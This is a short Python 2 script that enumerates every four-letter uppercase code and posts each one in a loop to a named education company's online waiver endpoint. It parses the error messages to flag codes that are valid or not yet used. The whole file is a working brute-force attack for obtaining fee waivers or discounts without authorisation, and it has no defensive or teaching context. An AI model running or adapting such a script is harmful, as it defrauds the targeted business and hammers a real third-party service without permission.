import string
import random
import requests
import json

i=159443

while 1:

	# a= ''.join(random.choice(string.ascii_uppercase ) for _ in range(4))
	# print a

	# i='A',j='A',k='A',l='A'
	# b = ''.join(i) for _ in range(4)
	b = string.uppercase[(i/(26*26*26)%26)] + string.uppercase[(i/(26*26)%26)] + string.uppercase[(i/(26)%26)] + string.uppercase[(i%26)]
	i = i+1
	print b
	url = "http://esonline.imsindia.com/Accounts/waiver"

	data = {'api_key':'12345678abcdefgh', 'product_id':'1', 'VariantCode':'129', 'WaiverCode':b}

	response = requests.post(url,data)
	# print response
	# print response.text
	# print response.json()

	print i
	if(response.ok):

	    # Loading the response data into a dict variable
	    # json.loads takes in only binary or string variables so using content to fetch binary content
	    # Loads (Load String) takes a Json file and converts into python data structure (dict or list, depending on JSON)
		jData = json.loads(response.text)

	    # print("The response contains {0} properties".format(len(jData)))
	    # print("\n")
	    # for key in jData:
	    #     print key + " : " + jData[key]
	    # print jData.values()
		# print jData['error'][0].encode('ascii','ignore')
		# print 'Waiver Code is Invalid'
		if 'error' not in jData:
			print 'asdf'
			print b
			print response.text

		if('Waiver Code is Invalid' != jData['error'][0].encode('ascii','ignore')):
			print 'FIND MEEEE'
			print b
			print response.text
			if ('Waiver code already used' != jData['error'][0].encode('ascii','ignore')):
				print 'OMGGGGG'
		else:
			pass
	    # print jData['error']
	    # if (jData['error'] != "[u'Waiver Code is Invalid']"): print response.text
	else:
	  # If response code is not ok (200), print the resulting http error code with description
	    response.raise_for_status()


